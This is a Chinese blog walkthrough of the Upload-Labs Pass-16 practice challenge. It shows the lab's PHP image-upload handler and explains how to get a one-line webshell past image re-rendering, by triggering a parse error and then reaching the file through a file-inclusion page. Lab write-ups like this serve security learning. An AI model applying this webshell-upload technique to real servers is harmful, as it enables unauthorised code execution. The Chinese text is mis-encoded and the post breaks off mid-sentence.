<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title class=pjax-title>Upload-Labsä¹‹Pass-16 - Braindance</title><meta name=Description content="Braindance's blog"><meta property="og:title" content="Upload-Labsä¹‹Pass-16"><meta property="og:description" content="å‰è¨€â€‹ æˆ‘åœ¨è¿™é“é¢˜ä¸ŠèŠ±äº†å¿«ä¸€å¤©çš„æ—¶é—´ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘å§¿åŠ¿ï¼Œè§‰å¾—ä¸œè¥¿åº”è¯¥è¶³å¤Ÿå¤šï¼Œè€Œä¸”å‚è€ƒäº†çš„åšå®¢å‘ç°è¿™é“é¢˜ç®—æ˜¯æœ‰æ­§ä¹‰çš„ï¼Œä¸çŸ¥é“ä½œè€…æƒ³è¦è€ƒå¯Ÿçš„ç‚¹"><meta property="og:type" content="article"><meta property="og:url" content="https://www.braindance.top/posts/upload-labs4/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-16T22:50:25+08:00"><meta property="article:modified_time" content="2020-11-16T22:50:25+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Upload-Labsä¹‹Pass-16"><meta name=twitter:description content="å‰è¨€â€‹ æˆ‘åœ¨è¿™é“é¢˜ä¸ŠèŠ±äº†å¿«ä¸€å¤©çš„æ—¶é—´ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘å§¿åŠ¿ï¼Œè§‰å¾—ä¸œè¥¿åº”è¯¥è¶³å¤Ÿå¤šï¼Œè€Œä¸”å‚è€ƒäº†çš„åšå®¢å‘ç°è¿™é“é¢˜ç®—æ˜¯æœ‰æ­§ä¹‰çš„ï¼Œä¸çŸ¥é“ä½œè€…æƒ³è¦è€ƒå¯Ÿçš„ç‚¹"><meta name=application-name content="Braindance"><meta name=apple-mobile-web-app-title content="Braindance"><meta name=theme-color content="#f8f8f8"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=canonical href=https://www.braindance.top/posts/upload-labs4/><link rel=prev href=https://www.braindance.top/posts/upload-labs3/><link rel=next href=https://www.braindance.top/posts/upload-labs5/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Upload-Labsä¹‹Pass-16","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.braindance.top\/posts\/upload-labs4\/"},"genre":"posts","keywords":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","wordcount":3857,"url":"https:\/\/www.braindance.top\/posts\/upload-labs4\/","datePublished":"2020-11-16T22:50:25+08:00","dateModified":"2020-11-16T22:50:25+08:00","publisher":{"@type":"Organization","name":"Braindance"},"author":{"@type":"Person","name":"Braindance"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark")}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else""==="light"||""==="dark"||""==="black"?(setTheme(""),saveTheme("")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")]</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Braindance>Braindance</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/ title=æ–‡ç« >æ–‡ç«  </a><a class=menu-item href=/tags/ title=æ ‡ç­¾>æ ‡ç­¾ </a><a class=menu-item href=/categories/ title=åˆ†ç±»>åˆ†ç±» </a><a class=menu-item href=/shuoshuo/ title=è¯´è¯´>è¯´è¯´ </a><a class=menu-item href=/about/ title=å…³äº>å…³äº </a><a class=menu-item href=/friend/ title=å‹é“¾>å‹é“¾ </a><a class=menu-item href=https://travellings.cn title=å¼€å¾€ rel="noopener noreferrer" target=_blank>ğŸš‡ å¼€å¾€ </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=æœäº›ä»€ä¹ˆ id=search-input-desktop>
<a href=# onclick=return!1 class="search-button search-toggle" id=search-toggle-desktop title=æœç´¢><i class="fas fa-search fa-fw"></i></a>
<a href=# onclick=return!1 class="search-button search-clear" id=search-clear-desktop title=æ¸…ç©º><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=# onclick=return!1 class="menu-item theme-switch" title=åˆ‡æ¢ä¸»é¢˜><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Braindance>Braindance</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=æœäº›ä»€ä¹ˆ id=search-input-mobile>
<a href=# onclick=return!1 class="search-button search-toggle" id=search-toggle-mobile title=æœç´¢><i class="fas fa-search fa-fw"></i></a>
<a href=# onclick=return!1 class="search-button search-clear" id=search-clear-mobile title=æ¸…ç©º><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=# onclick=return!1 class=search-cancel id=search-cancel-mobile>å–æ¶ˆ</a></div><a class=menu-item href=/posts/ title=æ–‡ç« >æ–‡ç« </a><a class=menu-item href=/tags/ title=æ ‡ç­¾>æ ‡ç­¾</a><a class=menu-item href=/categories/ title=åˆ†ç±»>åˆ†ç±»</a><a class=menu-item href=/shuoshuo/ title=è¯´è¯´>è¯´è¯´</a><a class=menu-item href=/about/ title=å…³äº>å…³äº</a><a class=menu-item href=/friend/ title=å‹é“¾>å‹é“¾</a><a class=menu-item href=https://travellings.cn title=å¼€å¾€ rel="noopener noreferrer" target=_blank>ğŸš‡å¼€å¾€</a><a href=# onclick=return!1 class="menu-item theme-switch" title=åˆ‡æ¢ä¸»é¢˜>
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>ç›®å½•</h2><div class=toc-content id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#å‰è¨€>å‰è¨€</a></li><li><a href=#pass-16>Pass-16</a></li><li><a href=#ç¬¬ä¸€ç§æ–¹æ³•>ç¬¬ä¸€ç§æ–¹æ³•</a><ul><li><a href=#jpgæ ¼å¼>jpgæ ¼å¼</a></li><li><a href=#å…¶ä»–æ ¼å¼>å…¶ä»–æ ¼å¼</a></li></ul></li><li><a href=#ç¬¬äºŒç§æ–¹æ³•>ç¬¬äºŒç§æ–¹æ³•</a><ul><li><a href=#gifæ ¼å¼>GIFæ ¼å¼</a></li><li><a href=#pngæ ¼å¼>pngæ ¼å¼</a></li><li><a href=#jpgæ ¼å¼-1>jpgæ ¼å¼</a></li></ul></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle","normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Upload-Labsä¹‹Pass-16</h1><div class=post-meta><div class=post-meta-line><span class=post-author><i class="author fas fa-user-circle fa-fw"></i><a href=/ title=Author rel=author class=author>Braindance</a>
</span>&nbsp;<span class=post-category>æ”¶å½•äº </span>&nbsp;<span class=post-category>ç±»åˆ« <a href=/categories/drops/><i class="far fa-folder fa-fw"></i>DROPS</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2020-11-16>2020-11-16</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2020-11-16>2020-11-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;çº¦ 3857 å­—&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;é¢„è®¡é˜…è¯» 8 åˆ†é’Ÿ&nbsp;<span id=/posts/upload-labs4/ class=leancloud_visitors data-flag-title=Upload-Labsä¹‹Pass-16>
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count id=twikoo_visitors></span>&nbsp;æ¬¡é˜…è¯»
</span>&nbsp;<span id=/posts/upload-labs4/ class=comment_count data-flag-title=Upload-Labsä¹‹Pass-16>
<i class="far fa-comments fa-fw"></i>&nbsp;<span class=twikoo-comment-count id=twikoo-comment-count></span>&nbsp;æ¡è¯„è®º
</span>&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>ç›®å½•</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#å‰è¨€>å‰è¨€</a></li><li><a href=#pass-16>Pass-16</a></li><li><a href=#ç¬¬ä¸€ç§æ–¹æ³•>ç¬¬ä¸€ç§æ–¹æ³•</a><ul><li><a href=#jpgæ ¼å¼>jpgæ ¼å¼</a></li><li><a href=#å…¶ä»–æ ¼å¼>å…¶ä»–æ ¼å¼</a></li></ul></li><li><a href=#ç¬¬äºŒç§æ–¹æ³•>ç¬¬äºŒç§æ–¹æ³•</a><ul><li><a href=#gifæ ¼å¼>GIFæ ¼å¼</a></li><li><a href=#pngæ ¼å¼>pngæ ¼å¼</a></li><li><a href=#jpgæ ¼å¼-1>jpgæ ¼å¼</a></li></ul></li></ul></nav></div></div><div class=content id=content><div class="details admonition warning open"><div class="details-summary admonition-title"><i class="icon fas fa-exclamation-triangle fa-fwwarning"></i>è­¦å‘Š<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>æœ¬æ–‡æœ€åæ›´æ–°äº <span class=timeago datetime=2020-11-16T22:50:25 title="November 16, 2020">2020-11-16</span>ï¼Œæ–‡ä¸­å†…å®¹å¯èƒ½å·²è¿‡æ—¶ã€‚</div></div></div><h2 id=å‰è¨€ class=headerLink><a href=#%e5%89%8d%e8%a8%80 class=header-mark></a>å‰è¨€</h2><p>â€‹ æˆ‘åœ¨è¿™é“é¢˜ä¸ŠèŠ±äº†å¿«ä¸€å¤©çš„æ—¶é—´ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘å§¿åŠ¿ï¼Œè§‰å¾—ä¸œè¥¿åº”è¯¥è¶³å¤Ÿå¤šï¼Œè€Œä¸”å‚è€ƒäº†çš„åšå®¢å‘ç°è¿™é“é¢˜ç®—æ˜¯æœ‰æ­§ä¹‰çš„ï¼Œä¸çŸ¥é“ä½œè€…æƒ³è¦è€ƒå¯Ÿçš„ç‚¹æ˜¯å“ªä¸€ä¸ªï¼Œæ‰€ä»¥ç®—æ˜¯æœ‰ä¸¤ç§è§£æ³•å§ï¼Œå¯æƒœçš„æ˜¯ä¸¤ç§æ–¹æ³•éƒ½ä¸ç®—æ˜¯å¤§æˆåŠŸï¼Œåªæœ‰éƒ¨åˆ†æˆåŠŸæ‰§è¡Œäº†ã€‚</p><p>â€‹ å‚è€ƒåšå®¢ï¼š<a href=https://xz.aliyun.com/t/2657#toc-4 target=_blank rel="noopener noreferrer">upload-labsä¹‹pass 16è¯¦ç»†åˆ†æ</a></p><h2 id=pass-16 class=headerLink><a href=#pass-16 class=header-mark></a>Pass-16</h2><p>â€‹ æºç ï¼ˆä¸‰ç§å›¾ç‰‡çš„åˆ¤å®šï¼Œåªè´´ä¸€ä¸ªå§ï¼Œç¯‡å¹…å°ä¸€ç‚¹ï¼‰ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$is_upload</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$msg</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;submit&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=c1>// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;upload_file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filetype</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;upload_file&#39;</span><span class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$tmpname</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;upload_file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$target_path</span><span class=o>=</span><span class=nx>UPLOAD_PATH</span><span class=o>.</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nx>basename</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$fileext</span><span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>strrchr</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span><span class=s2>&#34;.&#34;</span><span class=p>),</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>((</span><span class=nv>$fileext</span> <span class=o>==</span> <span class=s2>&#34;jpg&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$filetype</span><span class=o>==</span><span class=s2>&#34;image/jpeg&#34;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$tmpname</span><span class=p>,</span><span class=nv>$target_path</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=c1>//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$im</span> <span class=o>=</span> <span class=nx>imagecreatefromjpeg</span><span class=p>(</span><span class=nv>$target_path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$im</span> <span class=o>==</span> <span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nv>$msg</span> <span class=o>=</span> <span class=s2>&#34;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=nv>$target_path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nx>srand</span><span class=p>(</span><span class=nx>time</span><span class=p>());</span>
</span></span><span class=line><span class=cl>                <span class=nv>$newfilename</span> <span class=o>=</span> <span class=nx>strval</span><span class=p>(</span><span class=nx>rand</span><span class=p>())</span><span class=o>.</span><span class=s2>&#34;.jpg&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=c1>//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$img_path</span> <span class=o>=</span> <span class=nx>UPLOAD_PATH</span><span class=o>.</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$newfilename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>imagejpeg</span><span class=p>(</span><span class=nv>$im</span><span class=p>,</span><span class=nv>$img_path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=nv>$target_path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nv>$is_upload</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$msg</span> <span class=o>=</span> <span class=s2>&#34;ä¸Šä¼ å‡ºé”™ï¼&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span> <span class=k>if</span><span class=p>((</span><span class=nv>$fileext</span> <span class=o>==</span> <span class=s2>&#34;png&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$filetype</span><span class=o>==</span><span class=s2>&#34;image/png&#34;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=o>......</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span> <span class=k>if</span><span class=p>((</span><span class=nv>$fileext</span> <span class=o>==</span> <span class=s2>&#34;gif&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$filetype</span><span class=o>==</span><span class=s2>&#34;image/gif&#34;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=o>.....</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$msg</span> <span class=o>=</span> <span class=s2>&#34;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>â€‹ æç¤ºï¼š<code>æœ¬passé‡æ–°æ¸²æŸ“äº†å›¾ç‰‡ï¼</code>ã€‚è¯´æ˜å¯¹å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“ï¼Œæˆ‘çš„ç†è§£å°±æ˜¯æŠŠä¸Šä¼ çš„å›¾ç‰‡ï¼Œæ ¹æ®ä¸€äº›æ ‡å‡†ï¼ŒåªæŠŠå›¾ç‰‡ä¸­çš„å›¾ç‰‡ä¿¡æ¯æå–å‡ºæ¥ï¼Œå†ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡ï¼Œå¯ä»¥æœ‰æ•ˆé¿å…å›¾ç‰‡é©¬ã€‚</p><p>â€‹ é¦–å…ˆæ˜¯åˆ†æä¸€æ³¢æºç ï¼š</p><p>â€‹ ä»¥jpgæ–‡ä»¶åˆ¤å®šä¸ºä¾‹ã€‚è·å–æ–‡ä»¶åã€ç±»å‹ã€ä¸´æ—¶æ–‡ä»¶è·¯å¾„ï¼Œè·å–æ–‡ä»¶åç¼€ï¼Œè¿›å…¥jpgå›¾ç‰‡åˆ¤å®šï¼Œåˆ¤å®šçš„æ–¹å¼æ˜¯é€šè¿‡æ–‡ä»¶åç¼€å’Œæ–‡ä»¶çš„ç±»å‹åˆ¤å®šï¼Œå†æ‰§è¡Œ<code>move_uploaded_file</code>å‡½æ•°å…ˆæŠŠæ–‡ä»¶ç§»åŠ¨åˆ°<code>upload</code>æ–‡ä»¶å¤¹ï¼Œç°åœ¨æ–‡ä»¶è·¯å¾„æ˜¯<code>$target_path</code>ï¼Œä¹‹åå¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ã€‚</p><p>â€‹ äºŒæ¬¡æ¸²æŸ“ç”¨åˆ°äº†<code>imagecreatefromjpeg</code>å‡½æ•°ï¼Œå®˜æ–¹è§£é‡Šï¼šç”±æ–‡ä»¶æˆ– URL åˆ›å»ºä¸€ä¸ªæ–°å›¾è±¡ï¼Œè¿”å›ä¸€å›¾åƒæ ‡è¯†ç¬¦ï¼Œä»£è¡¨äº†ä»ç»™å®šçš„æ–‡ä»¶åå–å¾—çš„å›¾åƒï¼ˆè¿™æ—¶å€™å›¾åƒå¯¹è±¡è¿˜æ˜¯ä¸€ä¸ªç©ºçš„ï¼‰ã€‚ç„¶ååˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œå¦‚æœä¸æ˜¯çš„è¯æ‰§è¡Œ<code>unlink</code>å‡½æ•°åˆ é™¤æ–‡ä»¶ï¼Œå¦åˆ™ï¼Œä¸ºæ–°å›¾ç‰‡éšæœºä¸€ä¸ªåç§°ï¼Œæ‰§è¡Œ<code>imagejpeg</code>å‡½æ•°æŠŠå›¾è±¡è¾“å‡ºåˆ°æ–°æ–‡ä»¶<code> $newfilename</code>ã€‚å†å°†ä¹‹å‰ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶<code>$target_path</code>åˆ é™¤æ‰ã€‚</p><p>â€‹ æ ¹æ®ä¸Šé¢çš„åˆ†æå°±èƒ½å¾—å‡ºæ¥ä¸¤ç§æ€è·¯ï¼š</p><ol><li><strong>è®¿é—®äºŒæ¬¡æ¸²æŸ“ä¹‹å‰çš„ä¸Šä¼ çš„æ–‡ä»¶ã€‚</strong></li><li><strong>åœ¨å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä»¥åå›¾ç‰‡é©¬æœªå¤±æ•ˆã€‚</strong></li></ol><h2 id=ç¬¬ä¸€ç§æ–¹æ³• class=headerLink><a href=#%e7%ac%ac%e4%b8%80%e7%a7%8d%e6%96%b9%e6%b3%95 class=header-mark></a>ç¬¬ä¸€ç§æ–¹æ³•</h2><p>â€‹ ï¼ˆLinuxç¯å¢ƒã€phpç‰ˆæœ¬7.2.21ï¼‰</p><p>â€‹ å› ä¸ºäºŒæ¬¡æ¸²æŸ“é‚£éƒ¨åˆ†<code>ifã€else</code>æ— è®ºå¦‚ä½•éƒ½ä¼šæ‰§è¡Œ<code>unlink</code>å‡½æ•°åˆ é™¤ä½ çš„æ–‡ä»¶ï¼Œéœ€è¦åœ¨æ‰§è¡Œ<code>imagecreatefromjpeg</code>æ—¶æŠ¥é”™æ‰èƒ½è®¿é—®åˆ°è‡ªå·±åŸæ¥ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><h3 id=jpgæ ¼å¼ class=headerLink><a href=#jpg%e6%a0%bc%e5%bc%8f class=header-mark></a>jpgæ ¼å¼</h3><h4 id=å‡†å¤‡å¹¶ä¸Šä¼  class=headerLink><a href=#%e5%87%86%e5%a4%87%e5%b9%b6%e4%b8%8a%e4%bc%a0 class=header-mark></a>å‡†å¤‡å¹¶ä¸Šä¼ </h4><p>â€‹ éœ€è¦å‡†å¤‡åªå«æœ‰ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶å¹¶å‘½åä¸º.jpgæ ¼å¼ã€‚ç›´æ¥ä¸Šä¼ ã€‚</p><p><a class=lightgallery href=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png title=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png data-thumbnail=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png></a></p><h4 id=æ–‡ä»¶åŒ…å«éªŒè¯ class=headerLink><a href=#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e9%aa%8c%e8%af%81 class=header-mark></a>æ–‡ä»¶åŒ…å«éªŒè¯</h4><p>â€‹ ä¸Šä¼ ä»¥åæˆ‘ä½¿ç”¨çš„åœ¨çº¿é¶åœºç½‘é¡µä¸­é¢˜ç›®éƒ¨åˆ†ç›´æ¥æ¶ˆå¤±äº†ï¼Œè¿™å°±è¯´æ˜å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºé”™å¯¼è‡´é¡µé¢ä¹Ÿæ²¡æœ‰æ­£å¸¸è¿”å›ã€‚ç„¶åå°±å¯ä»¥ä½¿ç”¨<code>inclue.php</code>æ–‡ä»¶åŒ…å«è®¿é—®åˆšåˆšä¸Šä¼ çš„æ–‡ä»¶</p><p><a class=lightgallery href=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png title=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png data-thumbnail=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png></a></p><h3 id=å…¶ä»–æ ¼å¼ class=headerLink><a href=#%e5%85%b6%e4%bb%96%e6%a0%bc%e5%bc%8f class=header-mark></a>å…¶ä»–æ ¼å¼</h3><p>â€‹ å¦‚å›¾æˆåŠŸè®¿é—®å°±æ˜¯å›¾ç‰‡é©¬ä¸Šä¼ æˆåŠŸäº†ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•æˆ‘åªæœ‰<code>jpg</code>æ ¼å¼çš„æ–‡ä»¶ä¸Šä¼ æˆåŠŸäº†ï¼Œå¦å¤–ä¸¤ç§æ ¼å¼çš„å›¾ç‰‡æ²¡æœ‰ä¸Šä¼ 